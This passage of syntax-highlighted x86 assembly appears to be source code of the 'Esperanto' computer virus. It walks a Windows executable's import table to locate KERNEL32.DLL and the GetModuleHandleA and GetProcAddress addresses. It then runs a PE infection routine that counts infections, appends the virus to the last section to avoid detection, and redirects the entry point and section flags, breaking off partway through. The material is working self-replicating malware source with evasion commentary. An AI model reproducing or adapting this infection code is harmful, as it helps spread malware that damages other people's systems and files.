                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                       </span><span class="sc1">; and point it both</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; with DS:DX and DS:SI</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                       </span><span class="sc1">; Also DS:SI = DS:BP</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">                               </span><span class="sc1">; First doubleword</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">FH_Characteristics</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">IMAGE_FILE_EXECUTABLE_IMAGE</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">go_away</span><span class="sc0">
                                                    </span><span class="sc1">; We don't want neither</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">IMAGE_FILE_DLL</span><span class="sc0">           </span><span class="sc1">; DLLs nor non-exec PE</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">go_away</span><span class="sc0">                     </span><span class="sc1">; files, just skip them</span><span class="sc0">

                </span><span class="sc1">; Get number of sections of the PE file</span><span class="sc0">
                </span><span class="sc1">; and then point the first section with EDI</span><span class="sc0">

                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">FH_NumberOfSections</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">FH_SizeOfOptionalHeader</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_FILE_HEADER</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc5">s_image_sect</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">OH_DataDirectory\
</span><span class="sc0">                                            </span><span class="sc5">.DE_Import\
</span><span class="sc0">                                            </span><span class="sc5">.DD_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc5">SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

                </span><span class="sc1">; Now we're looking for the section in which</span><span class="sc0">
                </span><span class="sc1">; the import table is found. This is usually</span><span class="sc0">
                </span><span class="sc1">; the .idata section, but we make sure by</span><span class="sc0">
                </span><span class="sc1">; means of checking if the address of the</span><span class="sc0">
                </span><span class="sc1">; imports directory is inside this section</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc5">SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">section_is_ok</span><span class="sc0">

                </span><span class="sc1">; In case it's not, we point to the header</span><span class="sc0">
                </span><span class="sc1">; of the next section with EDI, and keep on</span><span class="sc0">
                </span><span class="sc1">; doing the same until we find it</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">s_image_sect</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">go_away</span><span class="sc0">

                </span><span class="sc1">; Now get a pointer to the first import</span><span class="sc0">
                </span><span class="sc1">; module descriptor in EAX so we may</span><span class="sc0">
                </span><span class="sc1">; look for KERNEL32.DLL thru this array</span><span class="sc0">

</span><span class="sc5">section_is_ok</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc5">SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">rawdata_ptr</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

                </span><span class="sc1">; Get absolute address to this array</span><span class="sc0">
                </span><span class="sc1">; in EDX and lseek to it in order to</span><span class="sc0">
                </span><span class="sc1">; read 4096 to our buffer, so we may</span><span class="sc0">
                </span><span class="sc1">; look for the KERNEL32.DLL descriptor</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lseek_middle</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">old_exe_header</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc1">; Restore EDX and point both with EAX and</span><span class="sc0">
                </span><span class="sc1">; EBP to the array of imported modules</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">

                </span><span class="sc1">; Get the RVA of the Import Module</span><span class="sc0">
                </span><span class="sc1">; Descriptor in ESI and later check</span><span class="sc0">
                </span><span class="sc1">; if it actually exists or not (=0)</span><span class="sc0">

</span><span class="sc5">next_imd_imge</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">ID_Name</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">kernel32_n</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">go_away</span><span class="sc0">

                </span><span class="sc1">; Now get the address of the name of</span><span class="sc0">
                </span><span class="sc1">; the IMD and check if it's the one</span><span class="sc0">
                </span><span class="sc1">; we're looking for (KERNEL32.DLL)</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">rawdata_ptr</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">

                </span><span class="sc1">; Get a character from DS:ESI, check its</span><span class="sc0">
                </span><span class="sc1">; case, convert it if necessary to uppercase</span><span class="sc0">
                </span><span class="sc1">; and then compare the strings pointed by</span><span class="sc0">
                </span><span class="sc1">; DS:ESI and DS:EDI (-&gt; KERNEL32.DLL)</span><span class="sc0">

</span><span class="sc5">dll_lewp</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'a'</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">check_charct</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,(</span><span class="sc12">'a'</span><span class="sc4">-</span><span class="sc12">'A'</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">check_charct</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">more_imd_imge</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">dll_lewp</span><span class="sc0">

                </span><span class="sc1">; Name matched, restore registers</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

                </span><span class="sc1">; Get file date/time and check if it is a</span><span class="sc0">
                </span><span class="sc1">; binded file (date 24/08/95, time 9:50)</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc2">1f184e40h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">go_away</span><span class="sc0">

                </span><span class="sc1">; Don't infect it in case it is binded.</span><span class="sc0">
                </span><span class="sc1">; Otherwise point the table of imported</span><span class="sc0">
                </span><span class="sc1">; addresses from the current module (K32)</span><span class="sc0">
                </span><span class="sc1">; and look for some necessary RVAs</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc5">ID_FirstThunk</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">thunk_offset</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

                </span><span class="sc1">; Lseek to the absolute offset and read</span><span class="sc0">
                </span><span class="sc1">; 4096 bytes to our buffer so we may look</span><span class="sc0">
                </span><span class="sc1">; for the RVAs of the APIs we need</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lseek_middle</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">old_exe_header</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc1">; Now let's go for GetModuleHandleA. We</span><span class="sc0">
                </span><span class="sc1">; need the RVA of this API because it is</span><span class="sc0">
                </span><span class="sc1">; necessary to call it in order to know</span><span class="sc0">
                </span><span class="sc1">; the base address of KERNEL32.DLL</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">gmhandle_n</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">search_name</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">gmhandle_rva</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">; Our next and last objective is the API</span><span class="sc0">
                </span><span class="sc1">; GetProcAddress, which helps us in order</span><span class="sc0">
                </span><span class="sc1">; to find the address of any API we look</span><span class="sc0">
                </span><span class="sc1">; for of a given module or library</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">gpaddress_n</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">search_name</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">gpaddress_rva</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">infect_pe</span><span class="sc0">

                </span><span class="sc1">; Go to next imported module descriptor</span><span class="sc0">

</span><span class="sc5">more_imd_imge</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_IMPORT_DESCRIPTOR</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">next_imd_imge</span><span class="sc0">

</span><span class="sc1">; ÄÄ´ PE files infection routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">infect_pe</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">inf_counter</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Increment inf.counter</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">                       </span><span class="sc1">; SI = BP -&gt; read buffer</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">winexe_offset</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Lseek to the PE</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lseek_middle</span><span class="sc0">                   </span><span class="sc1">; header ([3c8h])</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                      </span><span class="sc1">; And read 4096 bytes</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">                    </span><span class="sc1">; from it to our read</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                       </span><span class="sc1">; buffer, pointing it</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; with DS:DX and DS:SI</span><span class="sc0">

                </span><span class="sc1">; Get the RVA of the last section header in</span><span class="sc0">
                </span><span class="sc1">; EDI. Here's where we're going to copy our</span><span class="sc0">
                </span><span class="sc1">; code, so no new sections are needed and</span><span class="sc0">
                </span><span class="sc1">; we're not so easily discovered in a file</span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">FH_NumberOfSections</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">FH_SizeOfOptionalHeader</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_FILE_HEADER</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">; Now get the old entry point and store its</span><span class="sc0">
                </span><span class="sc1">; RVA in a dynamic variable of our code we</span><span class="sc0">
                </span><span class="sc1">; will use in order to jump back to our host</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">OH_AddressOfEntryPoint</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">entry_rva</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">; Get original file size and store it for</span><span class="sc0">
                </span><span class="sc1">; later use during the PE infection process</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc1">; Calculate new entry point by means of the</span><span class="sc0">
                </span><span class="sc1">; original file size and our memory size, and</span><span class="sc0">
                </span><span class="sc1">; save it as the new AddressOfEntryPoint</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">espow32_start</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">OH_AddressOfEntryPoint</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">; And store the RVA of the base address, not</span><span class="sc0">
                </span><span class="sc1">; forgetting to add the dseta offset to it</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">dseta_offset</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">base_address</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">; Get new size of VirtualSize</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">espo_file_size</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">espo_mem_size</span><span class="sc4">-</span><span class="sc5">espo_file_size</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">virtual_ok</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_VirtualSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">virtual_ok</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">; And now the new size of SizeOfRawData</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">espo_mem_size</span><span class="sc4">-</span><span class="sc5">espo_file_size</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">OH_FileAlignment</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cdq</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_SizeOfRawData</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">; Set section characteristics to execute, read</span><span class="sc0">
                </span><span class="sc1">; and write access, so Esperanto will not find</span><span class="sc0">
                </span><span class="sc1">; any problem when performing its functioning</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_Characteristics</span><span class="sc4">],\
</span><span class="sc0">                                      </span><span class="sc5">IMAGE_SCN_MEM_EXECUTE</span><span class="sc0"> </span><span class="sc5">or\
</span><span class="sc0">                                      </span><span class="sc5">IMAGE_SCN_MEM_READ</span><span class="sc0">    </span><span class="sc5">or\
</span><span class="sc0">                                      </span><span class="sc5">IMAGE_SCN_MEM_WRITE</span><span class="sc0">

                </span><span class="sc1">; Update the SizeOfImage pointer</span><span class="sc0">

